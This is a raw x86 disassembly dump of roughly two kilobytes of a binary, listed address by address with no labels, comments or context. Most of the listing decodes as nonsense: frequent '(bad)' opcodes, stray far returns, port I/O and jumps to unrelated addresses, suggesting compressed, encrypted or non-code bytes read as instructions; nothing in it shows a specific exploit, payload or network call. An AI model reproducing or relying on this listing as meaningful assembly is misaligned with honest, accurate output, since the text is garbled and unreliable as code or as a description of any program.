  417f62:	add    BYTE PTR [ebx],dh
  417f64:	push   0x518003
  417f69:	push   eax
  417f6a:	add    BYTE PTR [ebx-0x300748b],cl
  417f70:	sbb    BYTE PTR [ebp+0x45],cl
  417f73:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  417f79:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  417f7f:	dec    ebp
  417f80:	inc    ebp
  417f81:	xor    ecx,eax
  417f83:	add    ecx,eax
  417f85:	push   ecx
  417f86:	(bad)  
  417f87:	dec    ebp
  417f88:	mov    al,ds:0xc5e03dff
  417f8d:	retf   
  417f8e:	(bad)  
  417f8f:	into   
  417f90:	sub    bh,bh
  417f92:	dec    esp
  417f93:	adc    al,0x9c
  417f95:	inc    ebp
  417f96:	push   ebp
  417f97:	test   DWORD PTR [edi],ecx
  417f99:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  417fa0:	jmp    0xc9ba8eb4
  417fa5:	add    cl,dl
  417fa7:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  417fb1:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  417fb7:	rol    BYTE PTR [eax],0x55
  417fba:	clc    
  417fbb:	fs jb  0x417fc5
  417fbe:	mov    eax,DWORD PTR [ebp-0x30]
  417fc1:	xor    al,0x40
  417fc3:	sub    al,0xc7
  417fc5:	mov    ah,ch
  417fc7:	add    DWORD PTR [ebp+0x4534f845],eax
  417fcd:	sub    al,0x86
  417fcf:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  417fd6:	mov    ch,0xff
  417fd8:	clc    
  417fd9:	add    DWORD PTR [ebp+0x60],0x3d
  417fdd:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  417fe4:	inc    ebp
  417fe5:	dec    DWORD PTR [ebx-0x341ff701]
  417feb:	test   esi,ecx
  417fed:	dec    DWORD PTR [ebx-0x7f8a3301]
  417ff3:	push   eax
  417ff4:	add    DWORD PTR [ebp+0x0],eax
  417ff7:	dec    ebx
  417ff9:	or     al,0xce
  417ffb:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  418002:	into   
  418003:	add    BYTE PTR [ebx-0x34ff1400],cl
  418009:	mov    esi,ecx
  41800b:	sar    bh,0x45
  41800e:	adc    al,0x8b
  418010:	clc    
  418011:	fadd   DWORD PTR [ebp+0x0]
  418014:	mov    ebp,DWORD PTR [edx+0x8]
  418017:	push   edi
  418018:	adc    BYTE PTR [eax+0x1],0x83
  41801c:	add    al,al
  41801e:	retf   
  41801f:	mov    ecx,esi
  418021:	cld    
  418022:	mov    eax,DWORD PTR [eax+0xcb01cc]
  418028:	into   
  418029:	add    BYTE PTR [ebx+0x756aec00],cl
  41802f:	jne    0x418064
  418031:	inc    DWORD PTR [ebx]
  418033:	rcl    BYTE PTR [ecx+0x50],1
  418036:	push   eax
  418037:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  41803d:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  418044:	sar    bh,0x84
  418047:	or     BYTE PTR [ebx],al
  418049:	push   eax
  41804a:	add    BYTE PTR [ebx+0x4532c845],cl
  418050:	pushf  
  418051:	xor    edi,eax
  418053:	pushf  
  418054:	mov    ah,0x89
  418056:	test   eax,ebp
  418058:	clc    
  418059:	inc    ebp
  41805a:	inc    ebp
  41805b:	mov    DWORD PTR [eax+eax*8],esi
  41805e:	sub    al,0x30
  418060:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  418067:	dec    ebp
  418068:	xor    eax,DWORD PTR fs:[edi+0x3]
  41806c:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  418072:	xor    eax,DWORD PTR fs:[edi+0x3]
  418076:	or     DWORD PTR [ecx+0x45ff085c],0x0
  41807d:	shl    DWORD PTR [ebp-0x380064],1
  418083:	int3   
  418084:	lea    eax,[ebp+0x45fff860]
  41808a:	push   eax
  41808b:	xor    dh,BYTE PTR [ebp-0x64]
  41808e:	(bad)  
  41808f:	(bad)  
  418090:	pop    esp
  418091:	lods   al,BYTE PTR ds:[esi]
  418092:	inc    DWORD PTR [ebp+0x4508f8ff]
  418098:	mov    edi,DWORD PTR [eax+edx*8]
  41809b:	pushf  
  41809c:	jo     0x418065
  41809e:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  4180a5:	inc    ebp
  4180a6:	add    BYTE PTR [esi],bh
  4180a8:	push   0x8b809c
  4180ad:	in     al,dx
  4180ae:	inc    ebp
  4180af:	push   ebp
  4180b0:	mov    esi,DWORD PTR [ebx]
  4180b2:	cld    
  4180b3:	add    eax,DWORD PTR [eax+0xf013b]
  4180b9:	adc    al,0x0
  4180bb:	add    bh,bh
  4180bd:	jmp    0xbe81da
  4180c2:	add    BYTE PTR [ebp+0x45],cl
  4180c5:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4180cb:	dec    ebp
  4180cc:	push   0x38033
  4180d1:	cmp    eax,DWORD PTR [eax]
  4180d3:	unpcklps xmm7,xmm0
  4180d6:	jne    0x4180d8
  4180d8:	dec    DWORD PTR [ebx+0x5545cc18]
  4180de:	mov    DWORD PTR [ebx],esi
  4180e0:	shl    BYTE PTR [ebx],1
  4180e2:	inc    ebp
  4180e3:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4180e9:	retf   0x5575
  4180ec:	dec    DWORD PTR [ebx-0x5ba17e8]
  4180f2:	(bad)  
  4180f3:	stc    
  4180f4:	in     al,dx
  4180f5:	or     al,0x85
  4180f7:	dec    ebp
  4180f8:	clc    
  4180f9:	xor    eax,DWORD PTR [ebp+0x3]
  4180fc:	mov    ebp,ecx
  4180fe:	rol    BYTE PTR [eax],1
  418100:	inc    ebp
  418101:	add    BYTE PTR [eax-0x7747ab3],bh
  418107:	clc    
  418108:	inc    ebp
  418109:	retf   
  41810a:	mov    edx,ebx
  41810c:	in     al,dx
  41810d:	(bad)  
  41810e:	retf   
  41810f:	into   
  418110:	into   
  418111:	scas   eax,DWORD PTR es:[edi]
  418112:	dec    ebp
  418113:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  418119:	sub    ecx,esi
  41811b:	cmp    ecx,DWORD PTR [ebp+0x77]
  41811e:	(bad)  
  41811f:	mov    edi,eax
  418121:	int3   
  418122:	test   DWORD PTR [ecx-0x74baff08],ecx
  418128:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  41812f:	xor    eax,DWORD PTR [ebp+0x4503f803]
  418135:	(bad)  
  418137:	retf   0x559c
  41813a:	(bad)  
  41813b:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  418142:	inc    ebp
  418143:	add    eax,0xeb9c4d3f
  418148:	(bad)  
  418149:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  41814f:	xor    ecx,DWORD PTR [ebp+0x33]
  418152:	mov    eax,DWORD PTR [ebx]
  418154:	call   0xce514c5c
  418159:	retf   0x55d1
  41815c:	test   BYTE PTR [ebx-0x5ff17fe],cl
  418162:	jmp    0x41815d
  418164:	add    BYTE PTR ds:0xebf44d8b,al
  41816a:	push   ebp
  41816b:	mov    ebp,DWORD PTR [ebx]
  41816d:	mov    eax,0x33f8558b
  418172:	retf   
  418173:	xor    ecx,esi
  418175:	add    edx,ecx
  418177:	add    eax,DWORD PTR [edx+0xca010f]
  41817d:	push   ebp
  41817e:	dec    ebp
  41817f:	mov    ecx,DWORD PTR [ebx-0x34050718]
  418185:	stc    
  418186:	rol    DWORD PTR ds:0xebce4dd6,cl
  41818c:	scas   eax,DWORD PTR es:[edi]
  41818d:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  418193:	xor    ebp,DWORD PTR [ebx]
  418195:	xor    edi,DWORD PTR [ebx]
  418197:	add    esi,DWORD PTR [edi+0x3]
  41819a:	mov    ecx,DWORD PTR [edi]
  41819c:	clc    
  41819d:	retf   0x55cb
  4181a0:	into   
  4181a1:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4181a8:	test   al,0x4d
  4181aa:	push   ebp
  4181ab:	jbe    0x4181e0
  4181ad:	mov    esi,DWORD PTR [ebx]
  4181af:	mov    al,0x3
  4181b1:	push   ebp
  4181b2:	add    esi,DWORD PTR [ebx]
  4181b4:	rdpmc  
  4181b6:	retf   0x5503
  4181b9:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4181bf:	dec    ebp
  4181c0:	stc    
  4181c1:	mov    ecx,DWORD PTR [eax]
  4181c3:	or     BYTE PTR [ebp+0x4d],cl
  4181c6:	jmp    0x1358256
  4181cb:	dec    ebp
  4181cc:	dec    ebp
  4181cd:	(bad)  
  4181ce:	mov    ebx,esp
  4181d0:	clc    
  4181d1:	test   ebx,ecx
  4181d3:	clc    
  4181d4:	ror    DWORD PTR [ebp-0x2a],cl
  4181d7:	mov    esi,ecx
  4181d9:	lock scas eax,DWORD PTR es:[edi]
  4181db:	inc    ebp
  4181dc:	mov    esi,DWORD PTR [ebx]
  4181de:	hlt    
  4181df:	pushf  
  4181e0:	jge    0x41816d
  4181e2:	sub    ebx,esp
  4181e4:	cmp    ecx,ebx
  4181e6:	ja     0x4181b6
  4181e8:	mov    ebp,DWORD PTR [eax-0x58]
  4181eb:	dec    ebp
  4181ec:	xor    ecx,DWORD PTR [di+0x3]
  4181f0:	mov    esp,esp
  4181f2:	clc    
  4181f3:	push   ebp
  4181f4:	retf   
  4181f5:	mov    dl,bl
  4181f7:	adc    esi,edx
  4181f9:	jb     0x4181c9
  4181fb:	add    BYTE PTR [edi-0xb7474b3],ch
  418201:	lock jge 0x4181cf
  418204:	sub    ecx,DWORD PTR [ebp+0x3b]
  418207:	mov    esi,DWORD PTR [edi-0x20]
  41820a:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  418211:	mov    BYTE PTR [ebx-0x34b20729],cl
  418217:	mov    edx,ebx
  418219:	lock (bad) 
  41821b:	ror    esi,cl
  41821d:	push   ebp
  41821e:	scas   eax,DWORD PTR es:[edi]
  41821f:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  418225:	pushf  
  418226:	sub    esi,DWORD PTR [edx]
  418228:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  41822e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41822f:	xor    esp,DWORD PTR [ebx]
  418231:	add    ecx,DWORD PTR [ebp-0x1c]
  418234:	mov    edi,DWORD PTR [ebp-0x8]
  418237:	mov    bl,cl
  418239:	cmp    dl,bl
  41823b:	jb     0x41820b
  41823d:	add    dh,dl
  41823f:	dec    ebp
  418240:	scas   eax,DWORD PTR es:[edi]
  418241:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  418247:	shr    DWORD PTR [ebx],cl
  418249:	into   
  41824a:	cmp    edx,esi
  41824c:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  418252:	dec    ebp
  418253:	dec    ebp
  418254:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  41825a:	retf   
  41825b:	xor    edx,esi
  41825d:	add    ecx,esi
  41825f:	imul   ecx,edx
  418262:	mov    DWORD PTR [ebp+0x8],edx
  418265:	xor    ecx,DWORD PTR [ebp+0x2b]
  418268:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  41826e:	add    esi,DWORD PTR [ebx]
  418270:	rol    BYTE PTR [ebx],0x45
  418273:	rdtsc  
  418275:	xlat   BYTE PTR ds:[ebx]
  418276:	pushf  
  418277:	jge    0x418202
  418279:	xor    esp,eax
  41827b:	sub    eax,DWORD PTR [ebp-0x73]
  41827e:	(bad)  
  41827f:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  418286:	dec    ebp
  418287:	xchg   BYTE PTR [ebx],dh
  418289:	inc    DWORD PTR [ebx]
  41828b:	(bad)  
  41828c:	jmp    0x4182db
  41828e:	mov    ecx,DWORD PTR [ebx-0x34341324]
  418294:	dec    ebp
  418295:	into   
  418296:	mov    ebp,DWORD PTR [edi-0x23737420]
  41829c:	pushf  
  41829d:	shl    DWORD PTR [edx],cl
  41829f:	retf   0x5588
  4182a2:	or     ecx,DWORD PTR [ebp+0x7233114d]
  4182a8:	add    eax,DWORD PTR [eax]
  4182aa:	in     al,0x4d
  4182ac:	push   ebp
  4182ad:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  4182b3:	fs add ch,cl
  4182b6:	dec    ebp
  4182b7:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  4182bd:	dec    ebp
  4182be:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  4182c4:	jge    0x418294
  4182c6:	mov    BYTE PTR [edi+0xf723b3a],ch
  4182cc:	add    cl,dh
  4182ce:	dec    ebp
  4182cf:	dec    DWORD PTR [ebx-0x2c032301]
  4182d5:	inc    ebp
  4182d6:	push   ebp
  4182d7:	dec    DWORD PTR [ebx-0x73ff1f34]
  4182dd:	lea    ebx,[esp+edx*2+0x508bff32]
  4182e4:	mov    ah,0x45
  4182e6:	push   ebp
  4182e7:	mov    esi,DWORD PTR [ebx]
  4182e9:	les    esi,FWORD PTR [ebx]
  4182eb:	add    BYTE PTR [ebx],al
  4182ed:	inc    DWORD PTR [ebx]
  4182ef:	mov    ecx,DWORD PTR [edi]
  4182f1:	cld    
  4182f2:	retf   0x4d80
  4182f5:	add    DWORD PTR [ecx+0x4d30e400],ecx
  4182fb:	jne    0x418288
  4182fd:	(bad)  
  4182fe:	in     al,dx
  4182ff:	ror    bl,1
  418301:	scas   al,BYTE PTR es:[edi]
  418302:	into   
  418303:	add    BYTE PTR [edi-0xf2f7475],ch
  418309:	not    bl
  41830b:	adc    al,0xca
  41830d:	inc    ebp
  41830e:	push   ebp
  41830f:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  418315:	push   0xaf80d6
  41831a:	mov    eax,DWORD PTR [eax]
  41831c:	fdiv   st(7),st
  41831e:	sti    
  41831f:	sbb    dh,cl
  418321:	pop    esi
  418322:	xchg   esp,eax
  418323:	leave  
  418324:	pushf  
  418325:	add    al,0x32
  418327:	push   ebp
  418328:	cmp    ebp,esp
  41832a:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  41832e:	dec    DWORD PTR [ecx-0x740f0375]
  418334:	push   ebp
  418335:	cld    
  418336:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  41833c:	retf   0x558b
  41833f:	clc    
  418340:	xor    esi,eax
  418342:	add    esi,DWORD PTR [ebp-0x75]
  418345:	(bad)  
  418346:	hlt    
  418347:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  41834e:	mov    DWORD PTR [edx],ecx
  418350:	hlt    
  418351:	(bad)  
  418352:	dec    ebp
  418353:	add    dh,BYTE PTR [ebx]
  418355:	leave  
  418356:	mov    edx,0xffec8d55
  41835b:	push   ecx
  41835c:	rol    DWORD PTR [ebp+0x55],1
  41835f:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  418365:	mov    eax,0xf8030b33
  41836a:	lar    ecx,di
  41836d:	push   ebp
  41836e:	retf   0x863b
  418371:	jne    0x418370
  418373:	mov    edi,edi
  418375:	or     BYTE PTR [ebp+0x41],dh
  418378:	mov    ebp,esp
  41837a:	cld    
  41837b:	inc    eax
  41837c:	mov    al,0x25
  41837e:	add    DWORD PTR [ecx+0x0],eax
  418381:	in     eax,dx
  418382:	test   DWORD PTR [ecx-0x1],eax
  418385:	fdiv   st(7),st
  418387:	ret    0x8b
  41838a:	cld    
  41838b:	mov    eax,DWORD PTR [eax+0x8d0151]
  418391:	clc    
  418392:	xor    BYTE PTR [ebp+0x45],al
  418395:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  41839b:	loopne 0x41839c
  41839d:	mov    edi,edi
  41839f:	mov    ecx,eax
  4183a1:	clc    
  4183a2:	jne    0x418374
  4183a4:	call   0x8294ad
  4183a9:	and    eax,0xc6854575
  4183ae:	je     0x4183b1
  4183b0:	mov    eax,esi
  4183b2:	cld    
  4183b3:	or     DWORD PTR [eax+0x401c9],eax
  4183b9:	push   ebp
  4183ba:	add    ah,ch
  4183bc:	add    BYTE PTR [ecx+0x6a],dl
  4183bf:	inc    ebp
  4183c0:	push   esi
  4183c1:	mov    DWORD PTR [eax-0x4],edx
  4183c4:	pop    edi
  4183c5:	mov    ebx,DWORD PTR [ebx-0x4]
  4183c8:	ret    0xbe
  4183cb:	push   es
  4183cc:	mov    ecx,DWORD PTR [ecx-0x77274af]
  4183d2:	clc    
  4183d3:	lock inc ebp
  4183d5:	jne    0x41842d
  4183d7:	(bad)  
  4183d8:	jne    0x4183de
  4183da:	mov    eax,0xf841ba66
  4183df:	fadd   QWORD PTR [esi]
  4183e1:	(bad)  
  4183e2:	jne    0x418421
  4183e4:	cmp    eax,ebx
  4183e6:	pop    esi
  4183e7:	mov    ecx,DWORD PTR [eax]
  4183e9:	push   ecx
  4183ea:	inc    ecx
  4183eb:	lea    esi,[eax-0x8]
  4183ee:	inc    edx
  4183ef:	inc    ebp
  4183f0:	int    0x8b
  4183f2:	inc    edx
  4183f3:	cld    
  4183f4:	jo     0x4183b5
  4183f6:	inc    ecx
  4183f7:	xchg   edx,esp
  4183f9:	mov    ebx,eax
  4183fb:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  418401:	or     edi,eax
  418403:	inc    ebp
  418404:	inc    ebp
  418405:	(bad)  
  418406:	mov    ecx,DWORD PTR [eax]
  418408:	cld    
  418409:	(bad)  
  41840a:	jmp    0x41840d
  41840c:	mov    eax,esi
  41840e:	mov    DWORD PTR ds:0x4f8c98b,eax
  418414:	rcl    BYTE PTR [esi+0xf],1
  418417:	iret   
  418418:	inc    ebp
  418419:	leave  
  41841a:	(bad)  
  41841b:	dec    DWORD PTR [ecx]
  41841d:	mov    eax,esi
  41841f:	mov    eax,DWORD PTR [edi]
  418421:	mov    dh,0xdd
  418424:	push   es
  418425:	nop
  418426:	(bad)  
  418427:	inc    DWORD PTR [ebx]
  418429:	push   esi
  41842a:	leave  
  41842b:	iret   
  41842c:	add    al,0x46
  41842e:	push   ebp
  41842f:	jmp    0xff92da20
  418434:	inc    ebp
  418435:	push   esi
  418436:	mov    DWORD PTR [esi-0x4],eax
  418439:	in     eax,dx
  41843a:	push   ebp
  41843b:	sbb    BYTE PTR [eax+0x7c6daff],bh
  418441:	add    al,BYTE PTR [edx]
  418443:	mov    edx,DWORD PTR [ebp-0x17]
  418446:	cmp    edi,esi
  418448:	jne    0x418449
  41844a:	(bad)  
  41844b:	push   esi
  41844c:	pop    es
  41844d:	push   ebp
  41844e:	mov    ebp,esp
  418450:	or     BYTE PTR [ebp+0x41],al
  418453:	add    edi,esp
  418455:	sub    BYTE PTR [eax-0x4],al
  418458:	int3   
  418459:	jne    0x41841d
  41845b:	add    DWORD PTR [eax],eax
  41845d:	sbb    al,0x8b
  41845f:	mov    edx,DWORD PTR [ecx+0x14]
  418462:	lea    edx,[edx-0x1ba7508]
  418468:	push   esi
  418469:	enter  0xd375,0xb8
  41846d:	test   DWORD PTR [esi],0x6ce0750
  418473:	enter  0xd375,0x3b
  418477:	neg    DWORD PTR [esi+0x50]
  41847a:	or     cl,dl
  41847c:	inc    edx
  41847d:	(bad)  
  41847e:	loope  0x41846c
  418480:	(bad)  
  418481:	sub    eax,DWORD PTR [ebx]
  418483:	inc    eax
  418484:	loope  0x4184d6
  418486:	add    dl,BYTE PTR [eax-0x37]
  418489:	push   edi
  41848a:	push   ebp
  41848b:	imul   ah
  41848d:	adc    DWORD PTR [ecx-0x1],0x45
  418491:	add    BYTE PTR [ecx+0x55d3fc00],cl
  418497:	lea    edi,[eax-0x7fff4ca]
  41849d:	mov    eax,0x4550402
  4184a2:	cmp    ebp,ecx
  4184a4:	jne    0x418451
  4184a6:	mov    eax,DWORD PTR ds:0x241e808
  4184ac:	in     eax,dx
  4184ad:	add    BYTE PTR [eax-0x7],al
  4184b0:	out    0x36,eax
  4184b2:	inc    ecx
  4184b3:	aas    
  4184b4:	jmp    0xcd4736
  4184b9:	lock mov edi,DWORD PTR [ebp-0x18]
  4184bd:	and    edi,edi
  4184bf:	mov    edi,edi
  4184c1:	call   0xe40f859d
  4184c6:	push   es
  4184c7:	add    al,ch
  4184c9:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  4184d0:	(bad)  
  4184d1:	hlt    
  4184d2:	add    eax,0xffd3e87d
  4184d7:	cmp    bh,0x8
  4184da:	(bad)  
  4184db:	fld    DWORD PTR [esi]
  4184dd:	out    dx,al
  4184de:	call   0xffa083e6
  4184e3:	cmp    al,0x46
  4184e5:	shl    edx,0x8
  4184e8:	(bad)  
  4184e9:	pop    es
  4184ea:	fisttp QWORD PTR [ebp+0xe577eff]
  4184f0:	push   ebx
  4184f1:	add    BYTE PTR [ebx+0x24008b56],cl
  4184f7:	add    BYTE PTR [ebp+0x50],al
  4184fa:	push   eax
  4184fb:	add    DWORD PTR [ebx+0x757d1834],ecx
  418501:	sub    edx,DWORD PTR [esi-0x24]
  418504:	jne    0x4184bc
  418506:	lods   eax,DWORD PTR ds:[esi]
  418507:	mov    edx,DWORD PTR [edx-0x34]
  41850a:	dec    esi
  41850b:	out    0x83,eax
  41850d:	into   
  41850e:	push   edi
  418510:	loopne 0x4184e0
  418512:	shr    BYTE PTR [edx+ecx*4+0x0],1
  418516:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  41851d:	rol    DWORD PTR [edx],0x8
  418520:	mov    esp,ecx
  418522:	cmp    DWORD PTR [ebx],0xc
  418525:	mov    esi,0x5001c0
  41852a:	push   eax
  41852b:	push   cs
  41852c:	push   eax
  41852d:	(bad)  
  41852e:	sub    edx,edi
  418530:	push   esi
  418531:	adc    al,0xcb
  418533:	ins    DWORD PTR es:[edi],dx
  418534:	mov    eax,0x203e8
  418539:	add    al,ah
  41853b:	inc    esi
  41853c:	mov    al,ch
  41853e:	pop    es
  41853f:	add    DWORD PTR [eax],0x1
  418542:	add    dh,al
  418544:	add    ah,ch
  418546:	rol    DWORD PTR [edx-0xd],1
  418549:	cli    
  41854a:	push   0x4a
  41854c:	pop    ecx
  41854d:	retf   0xfe6
  418550:	add    BYTE PTR [ebx-0x4e72f41e],al
  418556:	(bad)  
  418557:	dec    BYTE PTR [ebx+0x45b1fc72]
  41855d:	(bad)  
  41855e:	sub    ebp,DWORD PTR [ebx]
  418560:	and    al,0x52
  418562:	(bad)  
  418563:	dec    edi
  418564:	inc    ebp
  418565:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  41856c:	add    BYTE PTR [ebp-0x7b],dh
  41856f:	pop    eax
  418570:	add    BYTE PTR [edx+0x0],bl
  418573:	pop    edx
  418574:	dec    ebp
  418575:	jmp    DWORD PTR [ebx]
  418577:	and    al,0xec
  418579:	push   edx
  41857a:	out    0x64,eax
  41857c:	jmp    0xd3f37b81
  418581:	jmp    0x4185db
  418583:	mov    al,0xfe
  418585:	dec    BYTE PTR [ebp-0x18fd8018]
  41858b:	add    BYTE PTR [esi+ebp*1],bh
  41858e:	pop    edx
  41858f:	icebp  
  418590:	mov    eax,cs
  418592:	ins    BYTE PTR es:[edi],dx
  418593:	adc    eax,0x75510000
  418598:	mov    esi,0x70158
  41859d:	or     DWORD PTR [eax-0x74f48dfe],esi
  4185a3:	mov    edi,esp
  4185a5:	cld    
  4185a6:	jge    0x41861d
  4185a8:	(bad)  
  4185aa:	aas    
  4185ab:	and    al,0x6d
  4185ad:	adc    cl,0x1
  4185b0:	mov    eax,DWORD PTR [eax]
  4185b2:	and    ecx,DWORD PTR [ebx-0x167203fd]
  4185b8:	dec    ebp
  4185b9:	add    eax,ebp
  4185bb:	add    BYTE PTR [edx],al
  4185bd:	fadd   DWORD PTR [eax]
  4185bf:	stc    
  4185c0:	enter  0xee00,0x8b
  4185c4:	sbb    eax,0x1
  4185c7:	sbb    esi,ecx
  4185c9:	in     al,0x0
  4185cb:	in     eax,dx
  4185cc:	add    BYTE PTR [eax],al
  4185ce:	jne    0x41855b
  4185d0:	cmp    edx,esp
  4185d2:	jb     0x4185dd
  4185d4:	jmp    0x41864b
  4185d6:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  4185dc:	add    BYTE PTR [ebx+0x4d83d840],cl
  4185e2:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  4185e8:	jb     0x418573
  4185ea:	pop    edx
  4185eb:	fadd   QWORD PTR [ebx-0x7445faa1]
  4185f1:	or     dh,BYTE PTR [edx+0x0]
  4185f4:	inc    edx
  4185f5:	or     dl,bh
  4185f7:	xlat   BYTE PTR ds:[ebx]
  4185f8:	dec    edx
  4185f9:	push   edi
  4185fa:	add    al,0x7
  4185fc:	leave  
  4185fd:	rol    DWORD PTR [edx+eax*1],0x7
  418601:	add    ecx,ecx
  418603:	mov    edx,ecx
  418605:	int3   
  418606:	jmp    0x4185c6
  418608:	mov    al,0x0
  41860a:	(bad)  
  41860b:	jne    0x4185f5
  41860d:	mov    eax,DWORD PTR [edx]
  41860f:	call   0xc1560314
  418614:	pop    edi
  418615:	add    ebx,DWORD PTR [ecx-0x37]
  418618:	pop    ecx
  418619:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  418620:	push   es
  418621:	mov    eax,DWORD PTR [eax]
  418623:	int3   
  418624:	add    ch,al
  418626:	jae    0x418610
  418628:	int    0x1
  41862a:	enter  0x3000,0x18
  41862e:	add    BYTE PTR [ebp+0x75],al
  418631:	mov    esi,DWORD PTR [eax-0x171f0134]
  418637:	push   0x2
  418639:	pop    ecx
  41863a:	add    BYTE PTR [eax],cl
  41863c:	push   ebx
  41863d:	lea    edi,[edi+eax*2]
  418640:	mov    al,0x1
  418642:	jb     0x418644
  418644:	mov    al,0x10
  418646:	push   eax
  418647:	add    al,0x75
  418649:	add    BYTE PTR [ebx],ch
  41864b:	add    ebx,esp
  41864d:	int3   
  41864e:	jne    0x418660
  418650:	movsx  edx,cl
  418653:	add    DWORD PTR [eax],eax
  418655:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  41865c:	mov    gs,edi
  41865e:	add    BYTE PTR [eax-0x50],ch
  418661:	add    al,ch
  418663:	mov    eax,DWORD PTR [ecx]
  418665:	sub    eax,DWORD PTR [eax]
  418667:	jb     0x4186de
  418669:	add    DWORD PTR [esp+eiz*8-0x50],esi
  41866d:	jge    0x418657
  41866f:	add    al,0x1
  418671:	add    DWORD PTR [eax],0x0
  418674:	jne    0x418676
  418676:	je     0x4186bd
  418678:	mov    eax,DWORD PTR [edi]
  41867a:	ror    BYTE PTR [ebp+0x4d],1
  41867d:	or     DWORD PTR [ecx+0x4d03d004],0x3
  418684:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  41868a:	mov    DWORD PTR [ebx],ebp
  41868c:	fadd   DWORD PTR [eax+0x75]
  41868f:	inc    eax
  418690:	pop    eax
  418691:	lea    ebx,[ecx+0x4f]
  418694:	push   0xb1000003
  418699:	out    dx,eax
  41869a:	add    ebp,DWORD PTR [edx+edx*2]
  41869d:	add    BYTE PTR [ebx+ecx*4],bh
  4186a0:	mov    ch,BYTE PTR [ebx]
  4186a2:	jb     0x418716
  4186a4:	add    al,0x89
  4186a6:	push   eax
  4186a7:	call   0x8429d419
  4186ac:	add    DWORD PTR [eax+eax*1],eax
  4186af:	jae    0x4186c5
  4186b1:	icebp  
  4186b2:	inc    ebp
  4186b3:	mov    eax,DWORD PTR gs:[ecx]
  4186b6:	int3   
  4186b7:	out    dx,al
  4186b8:	loopne 0x418707
  4186ba:	sub    eax,DWORD PTR [edx]
  4186bc:	push   0xffffff83
  4186be:	pop    esi
  4186bf:	push   cs
  4186c0:	jl     0x4186db
  4186c2:	add    al,0xaf
  4186c4:	xor    eax,0x832b6d00
  4186c9:	mov    eax,DWORD PTR [edx]
  4186cb:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4186d1:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4186d7:	inc    ebp
  4186d8:	shr    ebx,0x3
  4186db:	or     DWORD PTR [eax],0x4
  4186de:	push   0xffffffa5
  4186e0:	pop    esi
  4186e1:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4186e8:	jmp    0x418747
  4186ea:	mov    edi,0xff0272
  4186ef:	fdivr  QWORD PTR [ebp+0x5d]
  4186f2:	push   0x4e
  4186f4:	pop    ecx
  4186f5:	call   0x41cafa
  4186fa:	mov    DWORD PTR [ebx],eax
  4186fc:	in     al,0xc8
  4186fe:	rol    BYTE PTR [ebp-0x75],0xc1
  418702:	call   0xab88e3
  418707:	pop    esi
  418708:	enter  0xceff,0x8b
  41870c:	repz mov ecx,DWORD PTR [ebp-0x34]
  418710:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  418717:	je     0x418719
  418719:	or     DWORD PTR [ebx-0x74183b24],eax
  41871f:	jne    0x418705
  418721:	jmp    0x41871c
  418723:	push   DWORD PTR [edx-0x24]
  418726:	push   0x4d
  418728:	pop    ecx
  418729:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  41872d:	jge    0x418735
  41872f:	mov    eax,eax
  418731:	sub    ebp,DWORD PTR [edx+0x24]
  418734:	pop    esi
  418735:	inc    ebp
  418736:	mov    esp,0x8b6077
  41873b:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  418741:	lods   al,BYTE PTR ds:[esi]
  418742:	add    BYTE PTR [ebx],bh
  418744:	enter  0xce73,0x49
  418748:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  418750:	stc    
  418751:	jge    0x4187c5
  418753:	jnp    0xdd410ab4
  418759:	call   0xc4882f
  41875e:	fadd   st(0),st
  418760:	dec    esi
  418761:	ins    BYTE PTR es:[edi],dx
  418762:	stc    
  418763:	cmp    al,0x73
